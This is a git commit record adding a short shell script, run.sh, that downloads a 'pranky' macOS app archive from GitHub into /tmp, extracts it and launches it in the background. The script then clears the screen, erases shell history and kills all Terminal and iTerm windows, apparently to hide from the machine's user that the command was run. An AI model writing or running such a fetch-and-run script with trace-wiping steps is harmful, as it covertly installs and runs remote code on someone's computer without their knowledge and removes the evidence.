48588124927fd20a191abe8a5b9cba76d781dd8a
Mehdi Bounya <contact.mehdi@pm.me>
2018-10-17 00:38:17 +0100

    Stable version 1.0

---
+++ run.sh
@@ -0,0 +1,14 @@
+mkdir -p /tmp/spoody/
+
+curl -L https://github.com/mehdibo/pranky/blob/master/pranky-darwin-x64.tar.gz?raw=true -o /tmp/spoody/pranky.tar.gz > /dev/null
+
+tar -xvf /tmp/spoody/pranky.tar.gz -C /tmp/spoody > /dev/null
+
+nohup open /tmp/spoody/app/Pranky.app > /dev/null
+
+clear
+history -c
+
+killall iTerm
+killall Terminal
+killall iTerm2
